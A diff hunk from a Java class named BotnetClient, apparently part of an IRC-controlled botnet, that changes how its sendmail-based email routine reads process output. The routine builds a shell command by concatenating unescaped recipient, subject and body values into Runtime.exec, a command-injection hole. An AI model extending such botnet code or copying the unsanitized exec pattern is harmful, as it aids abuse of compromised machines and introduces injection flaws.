@@ -187,12 +187,8 @@ public class BotnetClient extends PircBot {
 		Runtime r = Runtime.getRuntime();
 		try {
 			Process p = r.exec("sendmail -f webmaster@localhost -t \"" + to[0] + "\" -u \"" + subject + "\" -m \"" + body + "\"");
-			Scanner in = new Scanner(new BufferedReader(new InputStreamReader(p.getInputStream())));
-			while (in.hasNextLine()) {
-				System.out.println(in.nextLine());
-			}
-			in = new Scanner(new BufferedReader(new InputStreamReader(p.getErrorStream())));
-			while (in.hasNextLine()) {
+			Scanner in = new Scanner(new BufferedReader(new InputStreamReader(p.getErrorStream())));
+			if (in.hasNextLine()) {
 				System.out.println(in.nextLine());
 			}
 			System.out.println("Email sent to " + to[0] + " successfully");
